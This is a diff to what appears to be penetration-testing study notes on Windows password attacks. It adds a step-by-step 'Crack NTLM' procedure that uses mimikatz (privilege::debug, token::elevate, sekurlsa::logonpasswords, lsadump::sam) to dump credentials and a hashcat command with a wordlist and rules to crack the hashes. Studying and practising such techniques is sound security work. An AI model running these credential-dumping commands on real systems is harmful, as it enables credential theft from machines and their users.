@@ -3481,6 +3481,7 @@ HTTP POST Attack
 - On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
 - Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
 - From Windows Vista on, the operating system disables LM by default and uses NTLM
+- In Windows, get all local users in PowerShell with `Get-LocalUser`
 
 #### Identify hashes
 - [hash-identifier](https://www.kali.org/tools/hash-identifier/)
@@ -3489,10 +3490,22 @@ HTTP POST Attack
 - [Hash Analyzer - TunnelsUP](https://www.tunnelsup.com/hash-analyzer/)
 
 #### mimikatz
-1. `C:\Programs\password_attacks\mimikatz.exe`
+1. `C:\Programs\mimikatz.exe`
 2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
 3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
 4. `lsadump::sam` dump the contents of the SAM database
+
+#### Crack NTLM
+1. Identify the local users with `Get-LocalUser`
+2. Run mimikatz.exe
+3. Use the command `privilege::debug` to have `SeDebugPrivilege` access right enabled
+4. Use the command `token::elevate` to elevate to SYSTEM user privileges
+5. Extract passwords from the system
+   - `sekurlsa::logonpasswords` attempts to extract plaintext passwords and password hashes from all available sources
+   - `lsadump::sam` extracts the NTLM hashes from the SAM
+6. Run `hashcat --help | grep -i "ntlm"` to retrieve the correct hash mode
+7. `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
 
 #### Pass-the-Hash
 - See ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
